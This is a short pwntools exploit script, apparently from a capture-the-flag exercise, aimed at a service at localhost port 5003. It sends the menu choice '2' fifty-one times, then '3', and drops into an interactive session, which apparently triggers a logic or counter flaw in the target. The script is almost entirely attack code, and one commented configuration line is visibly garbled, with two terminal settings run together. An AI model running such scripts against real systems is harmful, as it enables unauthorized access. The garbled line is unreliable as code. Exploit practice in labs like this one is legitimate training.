#!/usr/bin/python
from pwn import *

context.log_level = "debug"
context.terminal = ['gnome-terminal', '--', 'sh', '-c']
#context.terminal = ['tmux', 'splitw', '-hp', '60'minal = ["alacritty", "-e", "sh", "-c"]
#elf = ELF("./a.out")
#p = gdb.debug(elf.path, "c")
#p = process(elf.path)
p = remote("localhost", 5003)

for i in range(51):
    p.sendlineafter(b"Action: ", b"2")

p.sendlineafter(b"Action: ", b"3")
p.interactive()
